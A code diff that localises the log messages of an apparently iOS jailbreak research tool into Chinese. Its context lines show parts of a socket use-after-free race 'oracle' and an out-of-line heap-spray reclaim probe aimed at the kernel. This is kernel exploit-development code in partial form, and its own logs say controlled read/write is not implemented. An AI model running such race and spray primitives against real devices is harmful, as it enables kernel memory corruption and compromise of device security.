@@ -258,13 +258,13 @@ static int run_oracle(int iterations, int senders, int spray_count,
     uint16_t port = 0;
     int listener = make_listener(&port);
     if (listener < 0) {
-        log_message("[!] listener failed: %s", strerror(errno));
+        log_message("[!] 监听 Socket 创建失败：%s", strerror(errno));
         return -1;
     }
 
-    log_message("[oracle] port=%u senders=%d spray=%d iterations=%d",
+    log_message("[检测] 端口=%u 发送线程=%d 喷射数=%d 迭代=%d",
                 port, senders, spray_count, iterations);
-    log_message("[oracle] gate=persistent threads, close delay=%d us",
+    log_message("[检测] 常驻线程门闸已启用，关闭延迟=%d 微秒",
                 close_delay_us);
 
     pthread_t workers[IOSJB_MAX_SENDERS];
@@ -278,7 +278,7 @@ static int run_oracle(int iterations, int senders, int spray_count,
 
     for (int index = 0; index < senders; index++) {
         if (pthread_create(&workers[index], NULL, sender_worker, NULL) != 0) {
-            log_message("[!] sender %d creation failed", index);
+            log_message("[!] 发送线程 %d 创建失败", index);
             atomic_store(&g_config.stop, 1);
             close(listener);
             return -1;
@@ -297,7 +297,7 @@ static int run_oracle(int iterations, int senders, int spray_count,
 
         int target_fd = connect_loopback(port);
         if (target_fd < 0) {
-            log_message("[!] target connect failed at iteration %d: %s",
+            log_message("[!] 第 %d 轮目标连接失败：%s",
                         iteration, strerror(errno));
             break;
         }
@@ -305,7 +305,7 @@ static int run_oracle(int iterations, int senders, int spray_count,
         int target_peer = accept(listener, NULL, NULL);
         if (target_peer < 0) {
             close(target_fd);
-            log_message("[!] target accept failed at iteration %d: %s",
+            log_message("[!] 第 %d 轮目标 accept 失败：%s",
                         iteration, strerror(errno));
             break;
         }
@@ -320,8 +320,8 @@ static int run_oracle(int iterations, int senders, int spray_count,
 
         int entered = wait_for_entered(senders);
         if (entered < senders) {
-            log_message("[!] only %d/%d senders entered iteration %d",
-                        entered, senders, iteration);
+            log_message("[!] 第 %d 轮只有 %d/%d 个发送线程进入内核",
+                        iteration, entered, senders);
         }
 
         if (close_delay_us > 0) {
@@ -365,7 +365,7 @@ static int run_oracle(int iterations, int senders, int spray_count,
         if (iteration_bytes > 0) {
             hits += 1;
             total_stale_bytes += iteration_bytes;
-            log_message("[!] STALE WRITE CONFIRMED iteration=%d bytes=%d",
+            log_message("[!] STALE WRITE CONFIRMED / 已确认陈旧写入：迭代=%d 字节=%d",
                         iteration, iteration_bytes);
         }
 
@@ -378,7 +378,7 @@ static int run_oracle(int iterations, int senders, int spray_count,
 
         completed = iteration + 1;
         if (iteration % 25 == 0 || iteration_bytes > 0) {
-            log_message("[oracle] progress %d/%d hits=%d stale_bytes=%d",
+            log_message("[检测] 进度 %d/%d 命中=%d 陈旧字节=%d",
                         completed, iterations, hits, total_stale_bytes);
         }
         if (iteration % 25 == 24) {
@@ -392,12 +392,12 @@ static int run_oracle(int iterations, int senders, int spray_count,
     pthread_mutex_unlock(&g_gate.mutex);
     close(listener);
 
-    log_message("[oracle] complete attempts=%d hits=%d stale_bytes=%d",
+    log_message("[检测] 完成：尝试=%d 命中=%d 陈旧字节=%d",
                 completed, hits, total_stale_bytes);
     if (hits == 0) {
-        log_message("[oracle] no stale delivery observed; do not infer safety");
+        log_message("[检测] 未观察到陈旧数据投递，不能据此判断设备安全");
     } else {
-        log_message("[oracle] stale kernel write observed; controlled R/W is not implemented");
+        log_message("[检测] 已观察到内核 stale write；受控内核读写尚未实现");
     }
     return hits;
 }
@@ -488,7 +488,7 @@ static int run_reclaim_probe(void) {
         created += 1;
     }
 
-    log_message("[reclaim] allocated %d socket objects", created);
+    log_message("[回收] 已分配 %d 个 Socket 对象", created);
     for (int index = 0; index < created; index++) {
         close(fds[index]);
         fds[index] = -1;
@@ -496,7 +496,7 @@ static int run_reclaim_probe(void) {
     usleep(50000);
 
     int sprayed = ool_spray(0x4141414141414141ULL, 512);
-    log_message("[reclaim] sprayed %d OOL objects of %d bytes",
+    log_message("[回收] 已喷射 %d 个 %d 字节的 OOL 对象",
                 sprayed, IOSJB_OOL_SIZE);
     usleep(25000);
 
@@ -526,8 +526,8 @@ static int run_reclaim_probe(void) {
     close_array(probes, 64);
     ool_cleanup();
 
-    log_message("[reclaim] marker hits=%d (0 means no observed cross-zone reuse)", hits);
-    log_message("[reclaim] this probe does not trigger the socket UAF race");
+    log_message("[回收] 标记命中=%d（0 表示未观察到跨 Zone 复用）", hits);
+    log_message("[回收] 此探针不会触发 Socket UAF 竞态");
     return hits;
 }
 
@@ -542,10 +542,10 @@ static void *run_worker(void *context) {
     } else if (g_config.mode == IOSJB_MODE_RECLAIM) {
         result = run_reclaim_probe();
     } else {
-        log_message("[!] unknown mode %d", g_config.mode);
+        log_message("[!] 未知模式 %d", g_config.mode);
     }
 
-    log_message("[+] worker finished result=%d", result);
+    log_message("[+] 工作线程结束，结果=%d", result);
     atomic_store(&g_config.running, 0);
     return NULL;
 }
@@ -559,7 +559,7 @@ int32_t iosjb_start(int32_t mode,
     signal(SIGPIPE, SIG_IGN);
 
     if (atomic_load(&g_config.running)) {
-        log_message("[!] a probe is already running");
+        log_message("[!] 已有探针正在运行");
         return -1;
     }
     if (mode != IOSJB_MODE_ORACLE && mode != IOSJB_MODE_RECLAIM) {
@@ -577,7 +577,7 @@ int32_t iosjb_start(int32_t mode,
     pthread_t worker;
     if (pthread_create(&worker, NULL, run_worker, NULL) != 0) {
         atomic_store(&g_config.running, 0);
-        log_message("[!] worker creation failed");
+        log_message("[!] 工作线程创建失败");
         return -1;
     }
     pthread_detach(worker);
@@ -589,7 +589,7 @@ void iosjb_stop(void) {
     pthread_mutex_lock(&g_gate.mutex);
     pthread_cond_broadcast(&g_gate.condition);
     pthread_mutex_unlock(&g_gate.mutex);
-    log_message("[*] stop requested");
+    log_message("[*] 已请求停止");
 }
 
 int32_t iosjb_is_running(void) {
@@ -597,6 +597,6 @@ int32_t iosjb_is_running(void) {
 }
 
 const char *iosjb_version(void) {
-    return "0.1.0";
+    return "0.1.1";
 }
 
